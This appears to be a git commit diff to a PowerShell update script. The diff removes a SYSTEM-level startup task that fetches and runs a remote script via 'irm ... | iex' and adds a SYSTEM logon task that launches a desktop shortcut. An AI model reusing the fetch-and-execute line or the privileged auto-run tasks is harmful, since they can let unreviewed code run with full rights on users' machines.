8d71b4acde7fcedb60dac4e5ab036be57e098c24
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2025-06-03 11:45:30 -0700

    Update test1.ps1

--- test1.ps1
+++ test1.ps1
@@ -9,9 +9,9 @@ $endTime = Get-Date
 $logFile = "$env:HOMEPATH\Documents\timestamp.txt"
 "Update Part 1 started at: $startTime" | Out-File -FilePath $logFile
 "Update Part 1 completed at: $endTime" | Out-File -FilePath $logFile -Append
-$taskName = "RunOnceAfterReboot"
-Register-ScheduledTask -TaskName $taskName `
-  -Trigger (New-ScheduledTaskTrigger -AtStartup) `
-  -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/test2.ps1 | iex") `
-  -RunLevel Highest `
-  -User "SYSTEM"
+$taskName = "RunMyShortcut"
+$shortcutPath = "$env:HOMEPATH\Desktop\Finalize.lnk"
+
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start `"`" `"$shortcutPath`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"
